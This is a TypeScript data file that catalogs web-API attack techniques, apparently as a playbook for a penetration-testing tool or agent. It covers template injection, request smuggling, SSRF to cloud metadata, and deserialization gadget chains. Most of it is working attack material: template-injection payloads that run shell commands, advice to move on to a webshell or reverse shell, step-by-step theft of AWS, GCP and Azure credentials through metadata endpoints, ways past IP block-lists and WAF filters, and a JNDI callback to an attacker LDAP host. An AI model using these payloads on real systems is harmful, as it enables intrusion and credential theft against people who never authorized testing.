/** Technique catalog slice: web-api injection/smuggle/ssrf/deser. */
import type { TechniqueEntry } from "./types.ts";

export const WEB_API_INJECT_TECHNIQUES: readonly TechniqueEntry[] = [
	{
		id: "web-ssti",
		name: "Server-Side Template Injection (Jinja2/Twig/Freemarker)",
		domain: "web-api",
		mitre: ["T1190", "T1059"],
		cwe: ["CWE-1336", "CWE-94"],
		triggers:
			"User input is reflected into a server-side template render (Jinja2, Twig, Smarty, Freemarker, Velocity), error probes like `{{7*7}}` → `49`.",
		procedure: [
			"Confirm: `{{7*'7'}}` → `7777777` (Jinja2) vs `49` (Twig); use the polyglot `${{<%[%'\"}}%\\` to detect engine family.",
			"Jinja2 RCE: `{{ cycler.__init__.__globals__.os.popen('id').read() }}` or `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}` (sandbox-aware).",
			"Twig RCE: `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}` (older) or `{{['id']|filter('system')}}`.",
			'Freemarker: `${"freemarker.template.utility.Execute"?new()("id")}` (bypass `?api` with `?new`).',
			"Upgrade to a stable webshell / reverse shell only after a clean read proof.",
		],
		proofExit:
			"Command output (`id`/hostname) reflected from the server in a captured response, ≥2 distinct commands to rule out a static echo.",
		pitfalls: [
			"Many engines sandbox attribute access — the first payload usually fails; walk the MRO/globals chain.",
			"WAFs filter `__` / `os` — use attr getters like `|attr('__class__')` and hex/unicode escapes.",
			"Don't claim SSTI from a plain reflection bug; the engine must evaluate expressions server-side.",
		],
		tools: ["curl", "python3", "jq"],
	},
	{
		id: "web-request-smuggling",
		name: "HTTP request smuggling (CL.TE / TE.CL / TE.TE)",
		domain: "web-api",
		mitre: ["T1190"],
		cwe: ["CWE-444"],
		triggers:
			"Front-end and back-end disagree on Content-Length vs Transfer-Encoding (one ignores TE), request body reflected or stored, timing differences on crafted requests.",
		procedure: [
			"Detect with a timing probe: CL.TE `Transfer-Encoding: chunked` + `Content-Length` where front uses CL, back uses TE — a dangling chunk desyncs the next request.",
			"Confirm with the differential: send probe A (smuggle a prefix) then probe B; if B's response reflects the smuggled prefix or 403s differently, desync confirmed.",
			"Escalate: smuggle a request that poisons the next victim's response (stored redirect, reflected header), or bypass front-end routing/security.",
			"Use Burp Smuggle / a raw socket (`python3` http.client won't work — use `socket`) to control exact bytes.",
		],
		proofExit:
			"Demonstrated desync: the back-end interprets the smuggled bytes as the start of a DIFFERENT request, captured via a victim probe or response poisoning.",
		pitfalls: [
			"HTTPS/HTTP2 front-ends often normalize — test the exact front/back chain, not a guess.",
			"Non-deterministic timing; require the differential probe, not just a slow response.",
			"Tools that re-serialize requests (curl in some modes) hide the bug; use raw sockets.",
		],
		tools: ["python3", "burpsuite", "mitmproxy"],
	},
	{
		id: "web-ssrf-metadata",
		name: "SSRF → cloud metadata (IMDSv1/v2, GCP, Azure)",
		domain: "web-api",
		mitre: ["T1190", "T1552.007", "T1528"],
		cwe: ["CWE-918"],
		triggers:
			"Server fetches a user-supplied URL (webhook, image proxy, import), runs on AWS/GCP/Azure, no SSRF allowlist on egress.",
		procedure: [
			"Probe internal reachability: `http://169.254.169.254/` (AWS), `http://metadata.google.internal/` (GCP), `http://169.254.169.254/metadata/instance` (Azure).",
			"AWS IMDSv2: first `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600`, then use the token header to read `iam/security-credentials/<role>` → keys + token.",
			"GCP: `Metadata-Flavor: Google` header → `computeMetadata/v1/instance/service-accounts/default/token`.",
			"Azure: `Metadata: true` header → `instance?api-version=2021-02-01`.",
			"Use creds to escalate (AssumeRole / list buckets / pivot). Bypass allowlists via DNS rebinding, `@`, `#`, `[::]`, `0:0:0:0:0:ffff:169.254.169.254`, or a domain that resolves internally.",
		],
		proofExit:
			"Real metadata/credentials returned by the cloud endpoint via the vulnerable fetch, captured response; creds proven usable (STS GetCallerIdentity / list bucket).",
		pitfalls: [
			"IMDSv2 requires hop-limit 1 and a token — many SSRF sinks drop hop-2; v1 may be disabled entirely.",
			"Block-lists on `169.254.169.254` are bypassable via the IPv6-mapped form or DNS rebinding.",
			"Don't claim SSRF from a redirect to an internal IP without the server actually fetching it.",
		],
		tools: ["curl", "python3", "aws", "jq"],
	},
	{
		id: "web-deserialization-gadget",
		name: "Insecure deserialization gadget chains (Java/PHP/.NET/Python)",
		domain: "web-api",
		mitre: ["T1190", "T1203"],
		cwe: ["CWE-502"],
		triggers:
			"Endpoint accepts serialized objects (Java `ObjectInputStream`, PHP `unserialize`, .NET `BinaryFormatter`/`ViewState`, Python `pickle`/`yaml.load`), magic methods/`readObject` reachable.",
		procedure: [
			"Identify the format: base64 `rO0AB` (Java), `O:` (PHP serialized), ViewState (ASP.NET), `!python/object` (pickle).",
			"Enumerate available gadget libraries on the classpath (`ysoserial` for Java, `phpggc` for PHP, `ysoserial.net` for .NET).",
			"Generate a gadget chain matching the endpoint's sink: command exec, file write, SSRF, or blind DNS/JNDI.",
			"Java JNDI: `ysoserial` `CommonsCollections*` or `JndiLookup` → log4shell-style; for older JDKs `ldap://attacker/Exploit`, newer need local gadgets.",
			"Confirm blind: out-of-band DNS/HTTP callback ( Burp Collaborator / your listener) before interactive RCE.",
		],
		proofExit:
			"Out-of-band callback received from the target initiating the deserialized chain, OR command output reflected; chain + sink documented.",
		pitfalls: [
			"Gadget availability depends on classpath — enumerate libs first; a generic payload usually fails.",
			"JDK >=8u191 blocks remote class loading — need local gadget or serialized JNDI reference.",
			"ASP.NET ViewState needs machine key for forged ViewState; without it, no code exec.",
		],
		tools: ["python3", "java", "curl", "burpsuite"],
	},
];
